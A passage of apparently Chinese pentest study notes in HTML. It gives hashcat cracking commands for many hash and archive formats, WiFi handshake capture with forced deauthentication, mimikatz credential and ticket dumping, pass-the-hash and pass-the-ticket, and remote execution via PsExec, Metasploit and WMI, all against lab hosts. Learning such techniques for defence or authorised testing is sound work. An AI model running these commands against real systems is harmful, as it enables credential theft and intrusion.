<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 8fb5a3e7338ce951971d69be27fc5210 -1 ?u?d ?1?1?1?1 --increment --increment-min 1 --increment-max 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>指定特定字符集：123456abcdf!@+- 进行破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由于在终端里可能会把部分字符识别为特殊字符，因此需要转义一下</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf\!\@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果不知道目标密码的构成情况，可以直接使用 ?a 表示使用所有字符进行破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 19b9a36f0cab6d89cd4d3c21b2aa15be --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用字典破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 e10adc3949ba59abbe56e057f20f883e password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用字典批量破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 hash.txt password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字典组合破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 1 77b3e6926e7295494dd3be91c6934899 pwd1.txt pwd2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>经过测试，这里的字典组合破解，不是说简单的将两个字典的内容合并去重形成 1 个字典进行去重，而是说字典 1 的内容加上字典 2 的内容组合成一个字典，例如：</p>
<p>pwd1.txt 字典为：</p>
<pre class="line-numbers language-none"><code class="language-none">admintestroot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>pwd2.txt 字典为：</p>
<pre class="line-numbers language-none"><code class="language-none">@2021123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么组合后的字典就是这样的：</p>
<pre class="line-numbers language-none"><code class="language-none">admin@2021admin123test@2021test123root@2021root123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字典+掩码破解，也是和上面一样的组合方法，只不过 pwd2.txt 换成了掩码</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 6 e120ea280aa50693d5568d0071456460 pwd1.txt ?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Mysql4-1-5"><a href="#Mysql4-1-5" class="headerlink" title="Mysql4.1/5"></a>Mysql4.1/5</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>可以使用 select authentication_string from mysql.user; 查看当前数据库中的密码哈希值。</p>
</blockquote>
<h3 id="sha512crypt-6-SHA512-Unix"><a href="#sha512crypt-6-SHA512-Unix" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)"></a>sha512crypt $6$, SHA512 (Unix)</h3><p>sha512crypt $6$, SHA512 (Unix) 破解，为了避免系统误识别到特殊字符，这里为哈希值加了单引号</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X.&#39; ?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>可通过 cat /etc/shadow 获取哈希值</p>
</blockquote>
<p>或者不删除用户名，直接使用 –username 参数</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1&#39; ?l?l?l?l?l --username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>NT Hash</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>LM Hash</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>NetNTLM Hash</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 5500 teams.six::::822795daaf96s0a811fs6dd7b01dscssc601635cc1339basda6:e125cddcf51337asc7 -1 ?l?u ?1?1?1?1?d?d?d?d  --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="MSSQL-2005"><a href="#MSSQL-2005" class="headerlink" title="MSSQL (2005)"></a>MSSQL (2005)</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="WordPress-密码-hash"><a href="#WordPress-密码-hash" class="headerlink" title="WordPress 密码 hash"></a>WordPress 密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 400 --force &#39;$P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY&#x2F;&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>具体加密脚本在 ./wp-includes/class-phpass.php 的 HashPassword 函数</p>
</blockquote>
<h3 id="Discuz-用户密码-hash"><a href="#Discuz-用户密码-hash" class="headerlink" title="Discuz 用户密码 hash"></a>Discuz 用户密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>其密码加密方式 md5(md5($pass).$salt)</p>
</blockquote>
<h3 id="RAR-压缩密码"><a href="#RAR-压缩密码" class="headerlink" title="RAR 压缩密码"></a>RAR 压缩密码</h3><p>首先获取 rar 文件的 hash 值，我们可以使用另一款哈希破解工具 John 提供的 rar2john 工具将 rar 文件里的 hash 提取出来。</p>
<p>rar2john 下载地址：<a target="_blank" rel="noopener" href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p>
<pre class="line-numbers language-none"><code class="language-none"># 获取 rar 文件 hashrar2john.exe 1.rar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>hashcat 支持 RAR3-hp 和 RAR5</p>
<p>对于 RAR5，示例如下：</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13000 --force &#39;$rar5$16$b06f5f2d4c973d6235e1a88b8d5dd594$15$a520dddcc53dd4e3930b8489b013f273$8$733969e5bda903e4&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对于 RAR3-hp</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 12500 --force &#39;$RAR3$*0*5ba3dd697a8706fa*919ad1d7a1c42bae4a8d462c8537c9cb&#39; ?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>RAR3-hp 哈希头为 $RAR3$*0*，而不是 $RAR3$*1*，中间的数值是0（-hp）而不是1（-p），-p 尚未得到支持，只支持 -hp</p>
<p>关于 RAR 参数 -p 和 -hp 的区别：<br>-p：只对 RAR 文件加密，里面的目录和文件名没加密；<br>-hp：对目录中的文件名和子目录都进行加密处理</p>
</blockquote>
<h3 id="ZIP-压缩密码"><a href="#ZIP-压缩密码" class="headerlink" title="ZIP 压缩密码"></a>ZIP 压缩密码</h3><p>和 rar 破解过程一样，我们需要先提取 zip 文件的哈希值，这里可以使用 zip2john 进行获取，zip2john.exe 在上面下载的 rar2john.exe 的同级目录下。</p>
<pre class="line-numbers language-none"><code class="language-none"># 获取 zip 文件 hashzip2john.exe 1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13600 &#39;$zip2$*0*3*0*18b1a7e7ad39cb3624e54622849b23c7*5b99*3*5deee7*a418cee1a98710adce9a*$&#x2F;zip2$&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>这里 ZIP 的加密算法使用的 AES256</p>
</blockquote>
<h3 id="office-密码"><a href="#office-密码" class="headerlink" title="office 密码"></a>office 密码</h3><p>和 rar 与 zip 破解过程一样，我们需要先提取 office 文件的哈希值，这里可以使用 office2john.py 进行获取，office2john.py 在上面下载的 rar2john.exe 和 zip2john.exe 的同级目录下。</p>
<pre class="line-numbers language-none"><code class="language-none"># 获取 office 文件 hashpython office2john.py 1.docx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>测试中发现 python 会出现告警信息，不过这个告警信息不会影响程序执行</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 9600 &#39;$office$*2013*100000*256*16*cd8856416b1e14305a0e8aa8eba6ce5c*18cada7070f1410f3a836c0dfc4b9643*befcde69afeafb3e652719533c824413b00ce4a499589e5ac5bd7a7a0d3c4f3d&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>这里哈希头为 2013 所以使用 9600 破解模式，如果是 2010 则要使用 9500 破解模式，2007 则使用 9400 破解模式。</p>
</blockquote>
<h3 id="WIFI-密码"><a href="#WIFI-密码" class="headerlink" title="WIFI 密码"></a>WIFI 密码</h3><p>要破解 WIFI 密码，首先要抓到 WIFI 的握手包，要想得到 WIFI 的握手包，就需要在监听时刚好有设备连接了该 WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI 的设备踢下去，一般设备就会自动连接该 WIFI，此时我们就抓到握手包了。</p>
<p><strong>抓取 WIFI 握手包</strong></p>
<p>1、将网卡处于监听状态</p>
<pre class="line-numbers language-none"><code class="language-none">airmon-ng check airmon-ng check kill &#x2F;&#x2F; 关闭影响监听状态的进程airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>wlan0 是网卡名称，一般都是 wlan0，如果不是则需要根据自己的情况进行修改，可通过 iwconfig 进行查看网卡的名称</p>
</blockquote>
<p>当使用 iwconfig 查看网卡名称变为 wlan0mon 说明此时网卡已经处于监听模式了</p>
<p>2、扫描可用 WIFI</p>
<pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831104636.png"></p>
<p>3、获取wifi的握手包</p>
<pre class="line-numbers language-none"><code class="language-none">airodump-ng -c (上一步扫描的 CH ) --bssid (想要破解 WIFI 的 bssid ) -w (握手文件存放目录) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里以 ssid 为 teamssix 的 WIFI 为例</p>
<pre class="line-numbers language-none"><code class="language-none">airodump-ng -c 1 --bssid 5E:C1:1B:A2:37:F1 -w .&#x2F; wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p>
<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831105351.png"></p>
<p>可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去</p>
<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a 5E:C1:1B:A2:37:F1 -c 38:26:2C:13:D3:33 wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831132010.png"></p>
<p>4、破解密码</p>
<p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p>
<pre class="line-numbers language-none"><code class="language-none">aircrack-ng 1.cap -j 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2500 1.hccapx ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a target="_blank" rel="noopener" href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831113326.png"></p>
<h2 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h2><ul>
<li><p>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] –show 查看已破解出来的明文密码。</p>
</li>
<li><p>如果想再次破解已经破解过的密码，删除 ~/.hashcat/hashcat.potfile 文件里的对应记录即可。</p>
</li>
<li><p>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</p>
</li>
<li><p>在实际破解过程中，可以先使用 top 字典进行破解，不行再试试社工字典，比如姓名+生日的组合字典</p>
</li>
<li><p>Hashcat 参数优化：</p>
</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">--gpu-accel 160			可以让GPU发挥最大性能
--gpu-loops 1024		可以让GPU发挥最大性能
--segment-size 512	    可以提高大字典破解的速度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h1 id="0x21-哈希传递与票据传递"><a href="#0x21-哈希传递与票据传递" class="headerlink" title="0x21 哈希传递与票据传递"></a>0x21 哈希传递与票据传递</h1><h2 id="1、哈希传递"><a href="#1、哈希传递" class="headerlink" title="1、哈希传递"></a>1、哈希传递</h2><p>哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文密码登录的方式。</p>
<p>通过哈希传递，攻击者不需要花时间破解哈希值得到明文，在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，因此此时往往会使用工具将哈希值传递到其他计算机中进行登录验证。</p>
<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>在目标主机上使用 mimikatz 获取 NTLM Hash</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在远程主机上以管理员权限打开 mimikatz</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901120511.png"></p>
<p>mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。</p>
<h3 id="AES-256-密钥"><a href="#AES-256-密钥" class="headerlink" title="AES-256 密钥"></a>AES-256 密钥</h3><p>使用 mimikatz 抓取密钥</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::ekeys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在其他远程计算机中，以管理员权限打开 mimikatz</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;aes256:7358fb65149672d99b8c9f3dfd0dfeb486b78268e9c5250b23aefbd26f293c60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这里需要目标机器上安装 KB2871997 补丁，补丁下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=42722">https://www.microsoft.com/en-us/download/details.aspx?id=42722</a></p>
<p>将该补丁安装后，就可以通过 AES256 密钥进行哈希传递了。</p>
<p>除了 AES256 外还有 AES128 等，不过平时基本都是使用 NTLM 哈希进行传递。</p>
<h2 id="2、票据传递"><a href="#2、票据传递" class="headerlink" title="2、票据传递"></a>2、票据传递</h2><p>票据传递（Pass The Ticket, PTT）是基于Kerberos认证的一种攻击方式，这里主要学习票据传递在 mimikatz 和 kekeo 两个工具里的使用。</p>
<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>使用 mimikatz 可以将内存中的票据进行导出。</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>执行该命令后，会在当前目录下生成多个服务的票据文件，例如 kirbi 等</p>
<p>使用以下命令可以清除内存中的票据</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将票据文件注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;[0;4beae]-2-0-40e00000-Administrator@krbtgt-TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在当前终端下退出 mimikatz ，然后就可以列出目标目录了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901153402.png"></p>
<p>票据传递除了用 mimikatz 还可以用 kekeo</p>
<h3 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h3><p>kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票据导入，从而连接远程计算机。</p>
<pre class="line-numbers language-none"><code class="language-none">tgt::ask &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901154851.png"></p>
<p>在 kekeo 中清除当前内存中的其他票据，不然可能会导致票据传递失败</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 Windows 命令行中也可以执行系统自带的命令进行内存中的票据清除</p>
<pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用以下命令将票据导入内存，之后 exit 退出 kekeo，使用 dir 命令就可以列出远程文件了。</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901155501.png"></p>
<p>注意点：</p>
<p>1、票据文件注入内存的默认有效时间为 10 小时</p>
<p>2、在目标机器上不需要本地管理员权限就可以进行票据传递</p>
<p>3、使用票据传递时，dir 命令必须使用主机名，如果使用 IP 地址会提示拒绝访问。</p>
<h1 id="0x22-PsExec-和-WMI-的使用"><a href="#0x22-PsExec-和-WMI-的使用" class="headerlink" title="0x22 PsExec 和 WMI 的使用"></a>0x22 PsExec 和 WMI 的使用</h1><h2 id="1、PsExec"><a href="#1、PsExec" class="headerlink" title="1、PsExec"></a>1、PsExec</h2><h3 id="PsExec-exe"><a href="#PsExec-exe" class="headerlink" title="PsExec.exe"></a>PsExec.exe</h3><p>PsExec 在之前的文章里提到过一次，参见<a target="_blank" rel="noopener" href="https://teamssix.com/210802-181052.html">https://teamssix.com/210802-181052.html</a>，今天来着重学习一下。</p>
<p>PsExec 是 PSTools 工具包里的一部分，其下载地址为：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p>
<p>利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p>
<p>建立 ipc$ 连接</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator或者net use \\192.168.7.7 &#x2F;u:teamssix.com\administrator &quot;1qaz@WSX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限</p>
<pre class="line-numbers language-none"><code class="language-none">PsExec.exe -accepteula \\192.168.7.7 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902092309.png"></p>
<p>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</p>
<pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-u 域\用户名-p 密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者执行以下命令直接回显命令结果</p>
<pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe &#x2F;c &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在使用 PsExec 时需要注意以下几点：</p>
<ul>
<li>需要远程系统开启 admin$ 共享（默认是开启的）</li>
<li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</li>
<li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li>
<li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li>
<li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li>
<li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</li>
</ul>
<h3 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中也有 PsExec 的利用模块，使用方法如下：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexecset rhost 192.168.7.7set smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2、WMI"><a href="#2、WMI" class="headerlink" title="2、WMI"></a>2、WMI</h2><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。</p>
<p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p>
<h3 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic 命令</h3><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中</p>
<blockquote>
<p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\ip.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>之后建立 IPC$ ，使用 type 读取执行结果</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratortype \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902112523.png"></p>
<p>也可以预先建立 ipc$ 连接，再使用 wmic</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratorwmic &#x2F;node:192.168.7.7 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot;type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell</p>
<pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902113920.png"></p>
<p>wmiexec.py 还支持通过哈希传递获得 shell</p>
<pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes LMHash:NTHash 域名&#x2F;用户名@目标IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p>
<pre class="line-numbers language-none"><code class="langu